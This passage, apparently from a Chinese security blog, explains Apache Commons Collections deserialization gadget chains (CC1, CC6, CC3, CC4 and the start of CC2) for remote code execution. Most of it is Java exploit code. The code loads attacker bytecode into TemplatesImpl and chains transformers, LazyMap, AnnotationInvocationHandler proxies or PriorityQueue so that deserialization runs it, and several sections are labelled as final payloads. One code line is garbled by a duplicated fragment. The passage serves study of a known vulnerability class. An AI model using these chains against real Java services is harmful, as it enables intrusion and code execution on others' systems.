<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192240-ed5d381e-14dc-1.png"/><br/>
所以我们是不是可以创建一个类文件，在静态代码块中写入我们的恶意代码。然后javac编译成class字节码，最后通过Files进行读取？</p>
<p>创建一个Test.java，然后javac编译。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192249-f31c49f2-14dc-1.png"/><br/>
那我们的_bytecodes是不是可以通过Files读取出来？</p>
<div class="highlight"><pre><span></span><span class="n">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
<span class="n">Class</span><span class="o">&lt;?</span> <span class="kd">extends</span> <span class="n">TemplatesImpl</span><span class="o">&gt;</span> <span class="n">templatesClass</span> <span class="o">=</span> <span class="n">templates</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
<span class="n">Field</span> <span class="n">name</span> <span class="o">=</span> <span class="n">templatesClass</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_name"</span><span class="o">);</span>
<span class="n">name</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
<span class="n">name</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="s">"aaa"</span><span class="o">);</span>
<span class="n">Field</span> <span class="n">bytecodes</span> <span class="o">=</span> <span class="n">templatesClass</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_bytecodes"</span><span class="o">);</span>
<span class="n">bytecodes</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
<span class="kt">byte</span><span class="o">[]</span> <span class="n">code</span> <span class="o">=</span> <span class="n">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"/Users/relay/Documents/spring5MVC/Collections1/src/main/java/Test.class"</span><span class="o">));</span>
<span class="kt">byte</span><span class="o">[][]</span> <span class="n">codes</span> <span class="o">=</span> <span class="o">{</span><span class="n">code</span><span class="o">};</span>
<span class="n">bytecodes</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="n">codes</span><span class="o">);</span>
</pre></div>
<p>接下来我们还需要给_tfactory进行赋值，因为如果不给他赋值的话，他调用方法的时候会报空指针异常的。</p>
<p>_tfactory是TransformerFactoryImpl类型的。他是不能被序列化的。我们直接给他赋值是没用的，在反序列化的时候值是传不进去的。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192302-fae2da70-14dc-1.png"/><br/>
我们先看一下效果。</p>
<p>可以发现这里报了空指针的异常。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192312-00dd230e-14dd-1.png"/><br/>
我们进行调试。</p>
<p>可以清楚的看到我们的类已经加载了，但是下面还有两个判断就是说我们加载的类他的父类是不是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet这个类。</p>
<p>如果不是的话他就会报空指针异常，因为_auxClasses是没有给他赋值的，现在我们要么让我们的恶意类去继承com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet类，要么我们去给_auxClasses进行赋值。</p>
<p>但是下面判断说如果_transletIndex &lt; 0 的话，那么就会抛出异常，所以我们选择第一种方式。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192329-0ab93c96-14dd-1.png"/></p>
<p>继承com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet类并且实现它的方法。然后编译。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192339-1073d6f0-14dd-1.png"/><br/>
再次执行发现是可以执行的。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192347-1575e422-14dd-1.png"/><br/>
 我们后半段已经构造成功了</p>
<p>再次将我们CC1的这条链前半部分拿过来。</p>
<p>我们将他稍微改一下即可,让他进行反射调用即可。这里跟cc1是道理是一样的，也是循环去调用transformer，然后通过反射进行调用。</p>
<div class="highlight"><pre><span></span><span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span><span class="o">=</span><span class="k">new</span> <span class="n">Transformer</span><span class="o">[]</span><span class="n">n</span>  <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span><span class="o">=</span><span class="k">new</span> <span class="n">Transformer</span><span class="o">[]</span><span class="n">那个</span><span class="o">{</span>
                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">templates</span><span class="o">),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"newTransformer"</span><span class="o">,</span>
                        <span class="kc">null</span><span class="o">,</span>
                       <span class="kc">null</span><span class="o">)</span>
        <span class="o">};</span>
        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
        <span class="n">chainedTransformer</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">templates</span><span class="o">);</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192402-1e7bbb0a-14dd-1.png"/><br/>
这样的话我们就可以把CC1的拿过来就可以了。</p>
<div class="highlight"><pre><span></span><span class="n">HashMap</span> <span class="n">hashMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
<span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"value"</span><span class="o">,</span><span class="s">"aaav"</span><span class="o">);</span>
<span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">decorate</span> <span class="o">=</span> <span class="n">TransformedMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">hashMap</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">chainedTransformer</span><span class="o">);</span>

<span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">forName</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">);</span>
<span class="n">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">annotation</span> <span class="o">=</span> <span class="n">forName</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
<span class="n">annotation</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
<span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">annotation</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Retention</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">decorate</span><span class="o">);</span>

<span class="n">serialize</span><span class="o">(</span><span class="n">o</span><span class="o">);</span>
<span class="n">unserialize</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">);</span>
</pre></div>
<p>这样的话就是我们就光改了执行命令的地方。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192420-2919e0a0-14dd-1.png"/><br/>
那我们是不是也可以将cc6的那本部分拿过来。也是没有问题的</p>
<div class="highlight"><pre><span></span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;();</span>
<span class="n">Map</span> <span class="n">lazyMap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="mi">1</span><span class="o">));</span>
<span class="n">TiedMapEntry</span> <span class="n">tiedMapEntry</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TiedMapEntry</span><span class="o">(</span><span class="n">lazyMap</span><span class="o">,</span><span class="s">"aaa"</span><span class="o">);</span>

<span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">map2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
<span class="n">map2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">tiedMapEntry</span><span class="o">,</span><span class="s">"bbb"</span><span class="o">);</span>

<span class="n">lazyMap</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="s">"aaa"</span><span class="o">);</span>


<span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span> <span class="o">=</span>  <span class="n">LazyMap</span><span class="o">.</span><span class="na">class</span><span class="o">;</span>
<span class="n">Field</span> <span class="n">fieldfactory</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"factory"</span><span class="o">);</span>
<span class="n">fieldfactory</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
<span class="n">fieldfactory</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">lazyMap</span><span class="o">,</span><span class="n">chainedTransformer</span><span class="o">);</span>


<span class="n">serialize</span><span class="o">(</span><span class="n">map2</span><span class="o">);</span>
<span class="n">unserialize</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">);</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192431-2f96b3a4-14dd-1.png"/></p>
<h4 data-content="1" id="cc3ffe11fda865fa05eb4742e3a0beb3">CC3链(Ysoserial中的CC3)</h4>
<h5 data-content="1" id="36eb283e2a9ad248376b43ccc2bed788">最终payload</h5>
<h5 data-content="1" id="7d52a2f8d3f88161aa67ae9cc113be3a">流程分析</h5>
<p>我们知道CC3中是可以通过newTransformer进行执行代码的。</p>
<p>我们继续往上找看哪里调用了newTransformer。</p>
<p>我们可以看到在TrAXFilter类中的构造函数里面对_templates进行了赋值并且调用了他的newTransformer方法</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192441-35c15f9a-14dd-1.png"/><br/>
CC3的作者找到了InstantiateTransformer类，在这个类中他的transformer方法首先判断传进来的参数是不是class类型 如果是的话进行实例化。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192449-3aa0f07a-14dd-1.png"/><br/>
那我们是不是可以这样构造？</p>
<p>这里通过调用InstantiateTransformer类的transform方法，transform方法又调用了TrAXFilter类的构造方法方法</p>
<p>此时传过去的iArgs就是我们的templates，接着调用到我们TemplatesImpl类的newtransformer方法从而触发。我们后面就不需要使用到invokeTransformer来执行了。</p>
<div class="highlight"><pre><span></span><span class="n">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
<span class="n">Class</span> <span class="n">tc</span> <span class="o">=</span> <span class="n">templates</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
<span class="n">Field</span> <span class="n">name</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_name"</span><span class="o">);</span>
<span class="n">name</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
<span class="n">name</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="s">"aaaaaa"</span><span class="o">);</span>
<span class="n">Field</span> <span class="n">bytecodes</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_bytecodes"</span><span class="o">);</span>
<span class="n">bytecodes</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
<span class="kt">byte</span><span class="o">[]</span> <span class="n">code</span> <span class="o">=</span> <span class="n">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"/Users/relay/Documents/spring5MVC/Collections1/target/classes/Test.class"</span><span class="o">));</span>
<span class="kt">byte</span><span class="o">[][]</span> <span class="n">codes</span> <span class="o">=</span> <span class="o">{</span><span class="n">code</span><span class="o">};</span>
<span class="n">bytecodes</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="n">codes</span><span class="o">);</span>

<span class="n">Field</span> <span class="n">tfactory</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_tfactory"</span><span class="o">);</span>
<span class="n">tfactory</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
<span class="n">tfactory</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>
 <span class="n">InstantiateTransformer</span> <span class="n">instantiateTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InstantiateTransformer</span><span class="o">(</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">templates</span><span class="o">});</span>

<span class="n">instantiateTransformer</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">TrAXFilter</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192501-4175369a-14dd-1.png"/><br/>
那我们集合cc1是不是可以这样构造？</p>
<div class="highlight"><pre><span></span><span class="n">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
        <span class="n">Class</span> <span class="n">tc</span> <span class="o">=</span> <span class="n">templates</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
        <span class="n">Field</span> <span class="n">name</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_name"</span><span class="o">);</span>
        <span class="n">name</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">name</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="s">"aaaaaa"</span><span class="o">);</span>
        <span class="n">Field</span> <span class="n">bytecodes</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_bytecodes"</span><span class="o">);</span>
        <span class="n">bytecodes</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">code</span> <span class="o">=</span> <span class="n">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"/Users/relay/Documents/spring5MVC/Collections1/target/classes/Test.class"</span><span class="o">));</span>
        <span class="kt">byte</span><span class="o">[][]</span> <span class="n">codes</span> <span class="o">=</span> <span class="o">{</span><span class="n">code</span><span class="o">};</span>
        <span class="n">bytecodes</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="n">codes</span><span class="o">);</span>

        <span class="n">Field</span> <span class="n">tfactory</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_tfactory"</span><span class="o">);</span>
        <span class="n">tfactory</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">tfactory</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>
<span class="c1">//        templates.newTransformer();</span>

        <span class="n">InstantiateTransformer</span> <span class="n">instantiateTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InstantiateTransformer</span><span class="o">(</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">templates</span><span class="o">});</span>

        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span><span class="o">=</span><span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">TrAXFilter</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
                <span class="n">instantiateTransformer</span>
        <span class="o">};</span>
<span class="c1">//</span>
        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>

<span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;();</span>
        <span class="n">Map</span> <span class="n">lazyMap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="n">chainedTransformer</span><span class="o">);</span>
        <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">forName</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">);</span>
        <span class="n">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">annotation</span> <span class="o">=</span> <span class="n">forName</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">annotation</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">InvocationHandler</span> <span class="n">h</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">annotation</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Override</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">lazyMap</span><span class="o">);</span>

        <span class="n">Map</span> <span class="n">mapProxy</span> <span class="o">=</span> <span class="o">(</span><span class="n">Map</span><span class="o">)</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">LazyMap</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="n">h</span><span class="o">);</span>

<span class="c1">//        mapProxy.entrySet();</span>
        <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">annotation</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Override</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">mapProxy</span><span class="o">);</span>
        <span class="n">serialize</span><span class="o">(</span><span class="n">o</span><span class="o">);</span>
        <span class="n">unserialize</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">);</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192525-4fa43d60-14dd-1.png"/></p>
<h4 data-content="1" id="3cda0ad51997f0ad088b1f213834a333">CC4链</h4>
<h5 data-content="1" id="69b18f123e8261e186f6405b61f0b858">最终payload</h5>
<div class="highlight"><pre><span></span><span class="n">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
        <span class="n">Class</span> <span class="n">tc</span> <span class="o">=</span> <span class="n">templates</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
        <span class="n">Field</span> <span class="n">name</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_name"</span><span class="o">);</span>
        <span class="n">name</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">name</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="s">"aaaaaa"</span><span class="o">);</span>
        <span class="n">Field</span> <span class="n">bytecodes</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_bytecodes"</span><span class="o">);</span>
        <span class="n">bytecodes</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">code</span> <span class="o">=</span> <span class="n">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"/Users/relay/Documents/spring5MVC/Collections1/target/classes/Test.class"</span><span class="o">));</span>
        <span class="kt">byte</span><span class="o">[][]</span> <span class="n">codes</span> <span class="o">=</span> <span class="o">{</span><span class="n">code</span><span class="o">};</span>
        <span class="n">bytecodes</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="n">codes</span><span class="o">);</span>

        <span class="n">Field</span> <span class="n">tfactory</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_tfactory"</span><span class="o">);</span>
        <span class="n">tfactory</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">tfactory</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>
<span class="c1">//        templates.newTransformer();</span>

        <span class="n">InstantiateTransformer</span> <span class="n">instantiateTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InstantiateTransformer</span><span class="o">(</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">templates</span><span class="o">});</span>

        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span><span class="o">=</span><span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">TrAXFilter</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
                <span class="n">instantiateTransformer</span>
        <span class="o">};</span>
<span class="c1">//</span>
        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>

        <span class="n">TransformingComparator</span> <span class="n">transformingComparator</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TransformingComparator</span><span class="o">(</span><span class="n">chainedTransformer</span><span class="o">);</span>

        <span class="n">PriorityQueue</span> <span class="n">priorityQueue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PriorityQueue</span><span class="o">&lt;&gt;(</span><span class="n">transformingComparator</span><span class="o">);</span>
        <span class="n">priorityQueue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"aaaa"</span><span class="o">);</span>
        <span class="n">priorityQueue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"vvv"</span><span class="o">);</span>
        <span class="n">serialize</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">);</span>
        <span class="n">unserialize</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">);</span>
</pre></div>
<h5 data-content="1" id="33c5ac126fabbd8875732a5d45d1c605">流程分析</h5>
<p>CC4的漏洞版本是collections4</p>
<div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">dependency</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">groupId</span><span class="o">&gt;</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">&lt;/</span><span class="n">groupId</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="n">commons</span><span class="o">-</span><span class="n">collections4</span><span class="o">&lt;/</span><span class="n">artifactId</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">version</span><span class="o">&gt;</span><span class="mf">4.0</span><span class="o">&lt;/</span><span class="n">version</span><span class="o">&gt;</span>
<span class="o">&lt;/</span><span class="n">dependency</span><span class="o">&gt;</span>
</pre></div>
<p>CC4跟前面几个cc链是差不多的还是换汤不换药，最后还是到invoketransformer去执行的命令。</p>
<p>那我们就去找哪里调用了transformer</p>
<p>这里找到了一个在TransformingComparator类的compare方法调用了transformer方法</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192545-5bc5c3de-14dd-1.png"/><br/>
所以我们需要再往回找哪里调用了compare方法</p>
<p>在优先队列PriorityQueue类中的 siftDownUsingComparator方法中调用了compare方法,我们继续往上找看哪里调用了siftDownUsingComparator方法。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192554-616b0fec-14dd-1.png"/><br/>
来到siftDown方法，在siftDown方法中调用了siftDownUsingComparator方法</p>
<p>看哪里又调用了siftDown方法</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192605-677c7448-14dd-1.png"/><br/>
在heapify方法又调用了siftDown方法。恰好在readobject方法调用了heapify方法。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192615-6d620440-14dd-1.png"/><br/>
来到readobject方法</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192630-76841162-14dd-1.png"/><br/>
其实还是换汤不换药</p>
<p>那我们入口是不是可以构造为：</p>
<div class="highlight"><pre><span></span><span class="n">TransformingComparator</span> <span class="n">transformingComparator</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TransformingComparator</span><span class="o">(</span><span class="n">chainedTransformer</span><span class="o">);</span>

<span class="n">PriorityQueue</span> <span class="n">priorityQueue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PriorityQueue</span><span class="o">&lt;&gt;(</span><span class="n">transformingComparator</span><span class="o">);</span>

<span class="n">serialize</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">);</span>
<span class="n">unserialize</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">);</span>
</pre></div>
<p>但是我们发现他并没有执行代码<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192646-7fe80aba-14dd-1.png"/><br/>
进行调试断点在PriorityQueue类的readobject中下。我们发现在执行heapify方法的时候，我们的size右移3位是为0的但是如果是2的话，那么我们右移3位就是1了。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192656-86197838-14dd-1.png"/><br/>
 所以我们需要给priorityQueue添加两个元素。这样就可以成功执行了</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192706-8be90fee-14dd-1.png"/></p>
<h5 data-content="1" id="cc9ea79155d803760a3a3fc1a0b88bdb">小总结</h5>
<p>其实我们发现前半段使用的优先队列的类 后半部分还是使用的是cc3中的链。还是换汤不换药。</p>
<h4 data-content="1" id="c27d4087ad83c4488c0a551f250584a8">CC2链</h4>
<h5 data-content="1" id="91786f6ba568045ebeeacc4b73b7c02c">最终payload</h5>
<div class="highlight"><pre><span></span><span class="n">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
        <span class="n">Class</span> <span class="n">tc</span> <span class="o">=</span> <span class="n">templates</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
        <span class="n">Field</span> <span class="n">name</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_name"</span><span class="o">);</span>
        <span class="n">name</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">name</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="s">"aaaaaa"</span><span class="o">);</span>
        <span class="n">Field</span> <span class="n">bytecodes</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_bytecodes"</span><span class="o">);</span>
        <span class="n">bytecodes</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
